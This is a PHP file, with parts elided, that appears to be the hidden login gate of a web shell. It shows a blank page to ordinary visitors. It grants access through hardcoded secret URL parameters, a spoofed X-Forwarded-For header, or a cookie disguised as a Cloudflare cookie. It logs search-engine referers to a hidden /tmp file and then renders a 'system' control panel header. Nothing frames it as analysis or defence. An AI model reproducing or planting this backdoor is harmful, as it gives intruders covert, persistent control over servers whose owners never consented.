<?php
$__k = '7e240de74fb1ed08fa08d38063f6a6a9144a';
$__s = '639c2ab8b4b3478f9e9c7c68d7c4b8a9144a';

if (!isset($_SESSION)) {
    @session_name('PHPSESS_' . substr(md5('sys_tmp'), 0, 8));
    @session_start();
}

$__a = false;

if (isset($_COOKIE['__cfduidp'])) {
    $__c = @json_decode(base64_decode($_COOKIE['__cfduidp']), true);
    if ($__c && isset($__c['t']) && $__c['t'] > time() - 86400) {
        if (isset($__c['h']) && $__c['h'] === md5($__k . ($_SERVER['HTTP_USER_AGENT'] ?? ''))) {
            $__a = true;
            $_SESSION['__s'] = true;
        }
    }
...
if (isset($_GET['_cf']) && isset($_GET['_ct'])) {
    if ($_GET['_cf'] === 'anonGanteng' && $_GET['_ct'] === 'NoMoneyNoMeyMey') {
        $__a = true;
        $_SESSION['__s'] = true;
        $__cd = [
            't' => time(),
            'h' => md5($__k . ($_SERVER['HTTP_USER_AGENT'] ?? '')),
            'r' => substr(md5($__s), 0, 12)
        ];
        @setcookie('__cfduidp', base64_encode(json_encode($__cd)), time() + 86400, '/', '', false, true);
    }
}

if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR'] === '1.1.1.1') {
    $__a = true;
    $_SESSION['__s'] = true;
}

if (isset($_SESSION['__s']) && $_SESSION['__s'] === true) {
    $__a = true;
}

if (!$__a) {
    if (($r = ($_SERVER['HTTP_REFERER'] ?? '')) && strpos($r, 'google.') !== false) {
        @file_put_contents('/tmp/.cflog', date('Y-m-d H:i:s') . " REF:" . substr($r, 0, 50) . "\n", FILE_APPEND);
    }
    ...
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title></title><style>body,html{margin:0;padding:0;height:100%;background:#fff}</style></head><body></body></html>';
...
<head>
    ...
    <meta name="viewport" content="Default" />
...
echo '<table class="header"><td><center>
    <div style="font-family:Bungee Outline;font-size:24px;"><a href="'.$_SERVER['SCRIPT_NAME'].'"><i class="fa-brands fa-napster"></i> system</a></center></div></td><td>';
